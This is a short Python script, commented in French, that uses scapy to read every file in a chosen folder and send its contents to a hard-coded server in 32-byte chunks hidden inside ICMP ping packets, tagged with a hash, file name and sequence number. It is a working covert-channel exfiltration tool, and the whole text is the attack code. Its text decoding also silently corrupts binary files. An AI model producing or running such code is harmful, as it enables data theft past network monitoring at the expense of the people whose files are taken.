from scapy.all import *
import os
import hashlib
import time

# Adresse IP du serveur
server_ip = "192.168.1.1"

# Dossier à copier
folder = input("Enter the folder name: ")


# Parcourir tous les fichiers du dossier
for filename in os.listdir(folder):
    with open(os.path.join(folder, filename), "rb") as file:
        content = file.read()

    # Calculer le hash du contenu
    content_hash = hashlib.sha256(content).hexdigest()

    # Diviser le contenu en morceaux de 32 octets
    chunks = [content[i:i+32] for i in range(0, len(content), 32)]

    # Envoyer chaque morceau dans un paquet ICMP
    for sequence_number, chunk in enumerate(chunks, start=1):
        # Créer le paquet ICMP
        icmp_packet = IP(dst=server_ip)/ICMP()/("bob#" + content_hash + "#" + filename + "#" + str(len(chunks)) + "#" + str(sequence_number) + "#" + chunk.decode(errors="ignore"))

        # Envoyer le paquet
        send(icmp_packet)

        # Afficher un message de débogage
        print("Sent packet " + str(sequence_number) + " of " + str(len(chunks)))

        # Attendre 1 seconde avant d'envoyer le prochain paquet
        time.sleep(1)